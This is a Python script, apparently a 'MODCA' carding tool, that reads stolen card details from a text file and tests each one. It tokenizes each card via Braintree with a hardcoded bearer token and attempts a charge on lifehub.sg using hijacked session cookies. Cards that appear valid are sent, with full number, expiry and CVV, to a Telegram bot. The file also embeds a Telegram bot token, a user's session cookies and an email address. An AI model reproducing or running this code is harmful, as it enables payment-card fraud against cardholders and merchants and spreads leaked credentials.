O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
Z =  '\033[1;37m' #white
F = '\033[1;32m' #Green
B = '\033[2;36m' #Light Blue
X = '\033[1;33m' #Yellow
C = '\033[2;35m' #Purple
from cfonts import render
#print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")
output = render('MODCA', colors=['white', 'red'], align='center')
print(output)

print("~ 𝗣яσɢяαммεя • 𝗠𝗼𝗱𝗰𝗮 • -> @B_6_Q ~ 𝗖нαиияℓ : @ModcaTheLost ~")
print('\033[1;31m_' * 60)
print('\n')
import sys

authorized_users = [1296559148, 5966873984, 1296559148, 6695873549, 5702803191, 6174126557, 5612427625, 1970257616, 7408511525, 912917157, 6603688300, 5123986264, 6609362604, 1418522621, 2084607021, 6084792010, 1544900384]

def check_authorized(user_id):
    if user_id in authorized_users:
        return True
    else:
        return False

user = int(input(f"{O}Enter Your ID : "))

if check_authorized(user):
    print("تم تفعيل الأداة بنجاح، مرحبًا بك!")
else:
    print(f"{Z}   غير مصرح لك بتشغيل هذه الأداة.")
    print('\n')
    print('Tσσℓѕ Sтσρрє∂ ')
    print('\n')
    print('لا تحاول تسحب روابط | Protect By ModcaPy | ~ @B_6_Q ~ ')
    print('\n')

    print('https://t.me/ModcaTheLost ')
    print('هذه قناة التحديثات انضم وانتظر التحديثات ')
    sys.exit()

try:
        import requests
except ModuleNotFoundError:
        print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
        os.system('pip install requests')

try:
        import user_agent
except ModuleNotFoundError:
        print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
        os.system('pip install user_agent')


try:
        from fake_useragent import UserAgent
except ModuleNotFoundError:
        print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
        os.system('pip install fake_useragent')

try:
        from cfonts import render
except ModuleNotFoundError:
        print("- 𝗠σ𝗗υℓє 𝗘яяσя • انت غير مثبت المكتبة المطلوبة جاري تثبيتها..")
        os.system('pip install python-cfonts')


import os,user_agent,fake_useragent
from cfonts import render, say
import requests,time,webbrowser,json,os,sys,re,user_agent,random
from cfonts import render, say
import random,string,user_agent,base64
from fake_useragent import UserAgent

user = user_agent.generate_user_agent()
r = requests.session()
r.follow_redirects = True
r.verify = False

token2 = '6913577462:AAELQiwLjFjeKZgR2DXu4KXMPOnDoPAYkGg'
id2 = '5123986264'

Z =  '\033[1;31m'
F = '\033[2;32m'
B = '\033[2;36m'
X = '\033[1;33m'
C = '\033[2;35m'
w = '\033[2;37m'
y = '\033[1;34m'

import sys,time,os
def lo(word):
    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.1)
            sys.stdout.flush()
lo(" \x1b[1;36m      𝐖𝐚𝐢𝐭.𝐅𝐨𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐚𝐭𝐢𝐨𝐧... ")
os.system('clear')
from cfonts import render
#print("\x1b[1;39m","_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ")
output = render('MODCA', colors=['white', 'red'], align='center')
print(output)

print("~ 𝗣яσɢяαммεя • 𝗠𝗼𝗱𝗰𝗮 • -> @B_6_Q ~ 𝗖нαиияℓ : @ModcaTheLost ~")
print('\033[1;31m_' * 60)
print('\n')

token = input('Enter Your Token : ')
id = input('Enter Your ID : ')

file=open('Modca.txt',"+r")
start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    bin3=n[:6]
    mm=P.split('|')[1]
    if int(mm) == 12 or int(mm) == 11 or int(mm) == 10:
        mm = mm
    elif '0' not in mm:
        mm = f'0{mm}'
    else:
        mm = mm
    yy=P.split('|')[2]
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')
    if "20" not in yy:
        yy = f'20{yy}'
    else:
        yy = yy
    start_time = time.time()
    #time.sleep(10)

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQwNzY2NTksImp0aSI6IjgxOGZiOGFlLTg5OTUtNGYzMS04MDE3LTA0MzY1ZmU0ZDkxMiIsInN1YiI6InBiZ2dxNTZyNzR5NjVmZ3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiZ2dxNTZyNzR5NjVmZ3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.M_52cB1YJlNLE57SeN14HyUe-A9GtZ7cBb3Bj65Lm9nmdoW2GtGj3JgELaIJ5ArwM2ubWFrnQ4p9KRyU7in2Ew',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '4f503471-8c3c-4b68-8e3d-2fda8377d774',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

    try:
        tok = (response.json()['data']['tokenizeCreditCard']['token'])
    except TypeError:
        print('Call Modca To Update Habibi 💸 ')
        sys.exit()

    cookies = {
        'visid_incap_2624039': '/fudJLClQs259Q/frigJRaf9JWcAAAAAQUIPAAAAAACwGwdp3k0cPOgqg6iEYAFh',
        'osVisitor': '1875de0b-9cfb-4cfe-bd66-744771ee42be',        '_gcl_au': '1.1.346592010.1730543022',
        '_ga': 'GA1.1.214830494.1730543022',
        '_fbp': 'fb.1.1730543022262.343117564879421434',
        '3': 'ojJZPmMTWhk6Eoktt4P0sLYbyoxcvpDOLoIHrMiWbkb3sEDeFRggBeGcz9t4u3fu85dSTjv85ayO4bZOJaLxUN0hWlPNubrIxr9o3oX766SNWsZrG+NsNsprBzCVdEX1',
        '1': 'qprkeaqJ4xw2rqUU1qlYOf2Nv9xHwtKz1xbvfa0AXtQ2I1e7AKBmJwp6rI5dJW8mIFZz7P/yxH/uYK9y8tfPcuZ+y7V6zrBwdEocWcx3f6Wp5lI5OZBE0b6wR0U72GyaWwUGEiy67m7FoyC5fxgPqzehxZAeO+uVVQWm+9/JA2begjVXFmEPgvZd00Z/C9EGWNkBmlA/EBMZ9/yC3AqzuRgtEPXNl4oHuQt7rebwVSpZFcGPbWZLp5jqHfdrbtCBjHxMDYVrJJotrxyu5pwnHhWfyz4hA38tWxasE5Qq+pwuc8wu2AcPGENOA7gpr9w/TILvB8fecmmVxOeU3BtaDO5hHsF9SbyNx9dFUVhI3mxm9o6hIma97jlePMhGS2J7Ph2CXM3l/izA9LYFHz9i99H2ZeVmsNphqvaXz6uDYJx5wLYF3fRuSk/+9Ix3BUjYsBGHMPQXX5AGo9bqS1MSy5i308so+iv2uTJsiWGUQ8OHSHq+VAM0G4lb0RmDwYfhq5HYr9erH5r5EMzHUR3ABYBISHyzqYWmuv+YLFMNofIJmh8QVK0HseQiDqeWFR6PVjY+W+9WXWh4xfpM56sivqMjb2GuxDrtPjvQaCzqvWMqU/2KWOA+z9Z8ejwN5VeEKn3P2LY83OpIbCGjeuAOQ3rkMVtsCBb4YAMD/QHQTok4yKRT7TrUBbs6HHBwjMnRbRxKClBEbH1EZnXi/3tSHIb1MJBnFInxSveE7iGlWVFf7ha6XjFgsFim4YYggOOzr49w1LMhirbb+MbvWGYDz5cfmY629Wiups+r2CE0QUVoDkcCKHbc8kmPmKIwACA3rzS1bg0sKLWlSuP8b3nojEsbxVd5SfVLmO7mcQenEbHfb6qTSzBjV4+UC4MoG4TAxBo02b+ZqI+40/RYidhV3HagZ/gvo+h6Ta6CIpA8Gqcnc54w7blsL4EW7FtgPij/uJeklAAOcrrbBIoZqka9He+hjsedubOquBoHbzYsdG7EPNpEzhNAL7zNBr/oy5Ms+rhy5Q/1k29h8EfrmPn7dSLlcPrj8q2zpYQdIK9/M6662bSycBGoiISR+lyokXDcjnfk+xcuiqGspiyJYdXJRcPGC86i41XX2krFMz8yKSHeGPNqhBVGres83YG7j25cYST0/JGWkx9d2yjNq0lMK0DdC5WOl6pGn2vkpZsEhHM0sGrfrcjabZKv2zIKwe0Ce2n+2u54uX74wZ5bFMuMkDlfhIrczkP9ETXFdDNINt8PUoiktZ6iQse251KHnFp3vXZVrLX1KeuXoosnljb7svjylzdr7XmheoXgsJv1cshNpCAllpGlgAMt7beb2nWeYpfjpMk4pQGRLWrgXvH4P6/haGR2oHNOhCtiWbmTREZFpDKY1AO9nbxZPFxZq1x/KuSs+0QVdrikPe00APZWIVCgo1qgfUXVwDNdM3Docuw=',
        '2': 'Z6OyVWr1doyVFeSR8nGuVqBoBoW4V7ZWDoR/UiprSFVD1N8dAZWldL/dg9JZ29SgYuPEg463VdajsFXtQjRWLJo/eCRt8cjCWeQXZEKh9XLPWhTYut+cOMKTTDm20KUxt+wLzwiMj0wVNZIBNbl7bw==',
        'nr2ApolloUser_CS': 'crf%3dkHUF%2f2SaeYof2VV0aUMllJQo6V4%3d%3buid%3d1338501%3bunm%3dnikmokbb321%40gmail.com',
        'nlbi_2624039': 'ibn7X+K6N0mvx/zInrr3FQAAAAD88C1uGdWN65RaQir04O2C',
        'incap_ses_189_2624039': 'xCI5f0cjKGifcMoztXafAm+XWmcAAAAATZkFdEPikEcOxVi1T3NGCA==',
        'osVisit': 'e7dc3a94-2013-4f11-8ab9-6bda4886ca42',
        'nr1ApolloUser_CS': 'lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63869587356%3bexp%3d63872179056%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3dW%2fRv4%2fZP02tXjaG5qJmBC1bvcR0%3d',
        '_ga_WSCFS5WWZ0': 'GS1.1.1733990257.24.0.1733990257.0.0.0',
        'ASP.NET_SessionId': 'wmrnl5lxxdnzqw3nnvxvivhk',
    }

    headers = {
        'authority': 'www.lifehub.sg',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
        'content-type': 'application/json; charset=UTF-8',
        # 'cookie': 'visid_incap_2624039=/fudJLClQs259Q/frigJRaf9JWcAAAAAQUIPAAAAAACwGwdp3k0cPOgqg6iEYAFh; osVisitor=1875de0b-9cfb-4cfe-bd66-744771ee42be; _gcl_au=1.1.346592010.1730543022; _ga=GA1.1.214830494.1730543022; _fbp=fb.1.1730543022262.343117564879421434; 3=ojJZPmMTWhk6Eoktt4P0sLYbyoxcvpDOLoIHrMiWbkb3sEDeFRggBeGcz9t4u3fu85dSTjv85ayO4bZOJaLxUN0hWlPNubrIxr9o3oX766SNWsZrG+NsNsprBzCVdEX1; 1=qprkeaqJ4xw2rqUU1qlYOf2Nv9xHwtKz1xbvfa0AXtQ2I1e7AKBmJwp6rI5dJW8mIFZz7P/yxH/uYK9y8tfPcuZ+y7V6zrBwdEocWcx3f6Wp5lI5OZBE0b6wR0U72GyaWwUGEiy67m7FoyC5fxgPqzehxZAeO+uVVQWm+9/JA2begjVXFmEPgvZd00Z/C9EGWNkBmlA/EBMZ9/yC3AqzuRgtEPXNl4oHuQt7rebwVSpZFcGPbWZLp5jqHfdrbtCBjHxMDYVrJJotrxyu5pwnHhWfyz4hA38tWxasE5Qq+pwuc8wu2AcPGENOA7gpr9w/TILvB8fecmmVxOeU3BtaDO5hHsF9SbyNx9dFUVhI3mxm9o6hIma97jlePMhGS2J7Ph2CXM3l/izA9LYFHz9i99H2ZeVmsNphqvaXz6uDYJx5wLYF3fRuSk/+9Ix3BUjYsBGHMPQXX5AGo9bqS1MSy5i308so+iv2uTJsiWGUQ8OHSHq+VAM0G4lb0RmDwYfhq5HYr9erH5r5EMzHUR3ABYBISHyzqYWmuv+YLFMNofIJmh8QVK0HseQiDqeWFR6PVjY+W+9WXWh4xfpM56sivqMjb2GuxDrtPjvQaCzqvWMqU/2KWOA+z9Z8ejwN5VeEKn3P2LY83OpIbCGjeuAOQ3rkMVtsCBb4YAMD/QHQTok4yKRT7TrUBbs6HHBwjMnRbRxKClBEbH1EZnXi/3tSHIb1MJBnFInxSveE7iGlWVFf7ha6XjFgsFim4YYggOOzr49w1LMhirbb+MbvWGYDz5cfmY629Wiups+r2CE0QUVoDkcCKHbc8kmPmKIwACA3rzS1bg0sKLWlSuP8b3nojEsbxVd5SfVLmO7mcQenEbHfb6qTSzBjV4+UC4MoG4TAxBo02b+ZqI+40/RYidhV3HagZ/gvo+h6Ta6CIpA8Gqcnc54w7blsL4EW7FtgPij/uJeklAAOcrrbBIoZqka9He+hjsedubOquBoHbzYsdG7EPNpEzhNAL7zNBr/oy5Ms+rhy5Q/1k29h8EfrmPn7dSLlcPrj8q2zpYQdIK9/M6662bSycBGoiISR+lyokXDcjnfk+xcuiqGspiyJYdXJRcPGC86i41XX2krFMz8yKSHeGPNqhBVGres83YG7j25cYST0/JGWkx9d2yjNq0lMK0DdC5WOl6pGn2vkpZsEhHM0sGrfrcjabZKv2zIKwe0Ce2n+2u54uX74wZ5bFMuMkDlfhIrczkP9ETXFdDNINt8PUoiktZ6iQse251KHnFp3vXZVrLX1KeuXoosnljb7svjylzdr7XmheoXgsJv1cshNpCAllpGlgAMt7beb2nWeYpfjpMk4pQGRLWrgXvH4P6/haGR2oHNOhCtiWbmTREZFpDKY1AO9nbxZPFxZq1x/KuSs+0QVdrikPe00APZWIVCgo1qgfUXVwDNdM3Docuw=; 2=Z6OyVWr1doyVFeSR8nGuVqBoBoW4V7ZWDoR/UiprSFVD1N8dAZWldL/dg9JZ29SgYuPEg463VdajsFXtQjRWLJo/eCRt8cjCWeQXZEKh9XLPWhTYut+cOMKTTDm20KUxt+wLzwiMj0wVNZIBNbl7bw==; nr2ApolloUser_CS=crf%3dkHUF%2f2SaeYof2VV0aUMllJQo6V4%3d%3buid%3d1338501%3bunm%3dnikmokbb321%40gmail.com; nlbi_2624039=ibn7X+K6N0mvx/zInrr3FQAAAAD88C1uGdWN65RaQir04O2C; incap_ses_189_2624039=xCI5f0cjKGifcMoztXafAm+XWmcAAAAATZkFdEPikEcOxVi1T3NGCA==; osVisit=e7dc3a94-2013-4f11-8ab9-6bda4886ca42; nr1ApolloUser_CS=lid%3dup8g6a3gUUr2r4Cd1I%2btqQ%3d%3d0LWNjxz81NGX12YtygTBxg%3d%3d%3btuu%3d63869587356%3bexp%3d63872179056%3brhs%3dqmqs21oSCQNMIa57tnJPUgE%2bd9A%3d%3bhmc%3dW%2fRv4%2fZP02tXjaG5qJmBC1bvcR0%3d; _ga_WSCFS5WWZ0=GS1.1.1733990257.24.0.1733990257.0.0.0; ASP.NET_SessionId=wmrnl5lxxdnzqw3nnvxvivhk',
        'origin': 'https://www.lifehub.sg',
        'referer': 'https://www.lifehub.sg/product-payment',        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-csrftoken': 'kHUF/2SaeYof2VV0aUMllJQo6V4=',
    }

    json_data = {
        'versionInfo': {
            'moduleVersion': '2kO0xfHUmy5B4kIlM5D_vw',
            'apiVersion': 'OjcubfFn7YcjWGXofM4rfQ',
        },
        'viewName': 'LoggedInFlow_PurchaseProduct.PurchaseProductPayment',
        'inputParameters': {
            'Product': {
                'ProductDetails': {
                    'ProductId': '1',
                    'Name': '',
                    'ProductPrice': '0',
                    'TotalPrice': '21',
                    'DiscountPrice': '0',
                    'Order': 0,
                    'Description': '',
                    'Quantity': 0,
                },
            },
            'TokenNonce': tok,
        },
    }

    response = requests.post(
        'https://www.lifehub.sg/screenservices/NewApollo/LoggedInFlow_PurchaseProduct/PurchaseProductPayment/ActionStep2_GetProductPaymentTokenFor3DS',
        cookies=cookies,
        headers=headers,
        json=json_data,
    ).text

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"versionInfo":{"moduleVersion":"dPmoD0Lswu5LjWnllIRuLw","apiVersion":"OjcubfFn7YcjWGXofM4rfQ"},"viewName":"LoggedInFlow_PurchaseProduct.PurchaseProductPayment","inputParameters":{"Product":{"ProductDetails":{"ProductId":"1","Name":"","ProductPrice":"0","TotalPrice":"21","DiscountPrice":"0","Order":0,"Description":"","Quantity":0}},"TokenNonce":"tokencc_bh_n8fwyx_xjq9zc_h4yvtf_mkjsdp_bz6"}}'
#response = requests.post(
#    'https://www.lifehub.sg/screenservices/NewApollo/LoggedInFlow_PurchaseProduct/PurchaseProductPayment/ActionStep2_GetProductPaymentTokenFor3DS',
#    cookies=cookies,
#    headers=headers,
#    data=data,
#)
    end_time = time.time()
    elapsed_time = round(end_time - start_time, 2)
    #print(P,'>>',response.text)





























































































    if 'CHARGED' in response or 'avs' in response or 'postal' in response or 'approved' in response or 'Nice!' in response or 'Approved' in response or 'Duplicate' in response or 'Successful' in response or 'successful' in response or 'Thank you' in response or 'confirmed' in response or 'successfully' in response:
        print(f'{P} >> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅ < 2020: > < Everything ✅ > ')

    elif "Insufficient Funds" in response:
        print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < Google Play ✅ > ')
        requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
        Cαя∂ -> {n}|{mm}|{yy}|{cvc}
          Bιи -> {P[:6]}
          Gαтєωαу -> Braintree Auth
        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
        Rєѕρσиѕє -> Insufficient Funds ✅
        ID -> {id}
       Uѕєя αgєит -> {user}
                Tιмє -> {elapsed_time} SєcσиDѕ .

            Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
        #

    elif 'Card Issuer Declined CVV' in response:
        print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < 2010: 𝗖𝗖𝗡 ✅ > < Just Try The Sites ✅ > ')
        requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
        Cαя∂ -> {n}|{mm}|{yy}|{cvc}
          Bιи -> {P[:6]}
          Gαтєωαу -> Braintree Auth
        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
        Rєѕρσиѕє -> 𝗖𝗖𝗡 ✅
        ID -> {id}

       Uѕєя αgєит -> {user}
                Tιмє -> {elapsed_time} SєcσиDѕ .

            Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")#




    elif 'Gateway Rejected: cvv' in response:
        print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < cvv ✅ > < Google Play ✅ > ')
        requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
        Cαя∂ -> {n}|{mm}|{yy}|{cvc}
          Bιи -> {P[:6]}
          Gαтєωαу -> Braintree Auth
        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
        Rєѕρσиѕє -> 𝗔ρρяσνє𝗗 ✅ < cvv ✅ > ✅
        ID -> {id}

       Uѕєя αgєит -> {user}
                Tιмє -> {elapsed_time} SєcσиDѕ .

            Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")


    else:
        print(f'{P} >> DeaD ❌ ')
    time.sleep(25)

